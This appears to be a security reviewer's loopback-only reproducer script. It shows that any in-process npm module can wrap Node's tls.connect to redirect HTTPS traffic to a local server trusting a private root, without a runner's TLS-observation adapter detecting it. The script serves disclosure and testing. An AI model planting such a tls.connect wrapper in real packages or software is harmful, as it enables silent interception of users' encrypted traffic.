// RECHECK-4 reproducer (loopback only). In the v5 runner's real transport setup (npm undici 7.29.0 registered by cheerio),
// any in-process module can wrap node:tls `connect`. The dispatcher identity and the default CA store stay unchanged,
// yet the socket trusts a private root. Run from a v5 web root with the ts-node launcher; argv: <cert.pem> <port> <v5 web root>/scripts/blsh/nativeProcessCaptureAdapter.ts
const tls = require("node:tls"), net = require("node:net"), fs = require("node:fs"), crypto = require("node:crypto");
const [certPath, port, toolPath] = process.argv.slice(2);
const c = net.Socket.prototype.connect;
net.Socket.prototype.connect = function (...a) { const f = a[0], h = typeof f === "object" ? f.host : a[1]; if (!["127.0.0.1", "localhost", "::1"].includes(h)) throw new Error("reviewer guard"); return c.apply(this, a); };
require("node:module").createRequire(process.cwd() + "/package.json")("cheerio"); // as the runner does: loads npm undici, which registers its default Agent
const SYM = Symbol.for("undici.globalDispatcher.1"), anchor = globalThis[SYM];
const caHash = () => crypto.createHash("sha256").update(tls.getCACertificates("default").join("\n")).digest("hex");
const caBefore = caHash();
// The attack: a wrapper around tls.connect (what any of the ~32 in-process npm packages could install at import time).
const real = tls.connect;
tls.connect = function (opts, ...rest) { return real.call(this, { ...opts, host: "127.0.0.1", port: Number(port), ca: fs.readFileSync(certPath) }, ...rest); };
(async () => {
  const { withTlsObservation } = require(toolPath); // the pinned v5 adapter itself (aa6237bd…), loaded via ts-node
  const url = "https://api-web.nhle.com/v1/gamecenter/2026020293/boxscore";
  const r = await withTlsObservation(url, "GET", async () => { const res = await fetch(url, { redirect: "error" }); await res.arrayBuffer(); return { status: res.status }; });
  console.log(JSON.stringify({ status: r.status, authorized: r.tls.authorized, servername: r.tls.servername, issuerCNChain: r.tls.peerCertificate?.issuerCNChain,
    registryConstructor: globalThis[SYM]?.constructor?.name, identityUnchanged: globalThis[SYM] === anchor, caStoreUnchanged: caHash() === caBefore,
    tlsConnectReplaced: tls.connect !== real }));
  process.exit(0);
})().catch(e => { console.log(JSON.stringify({ error: String(e.message) })); process.exit(0); });
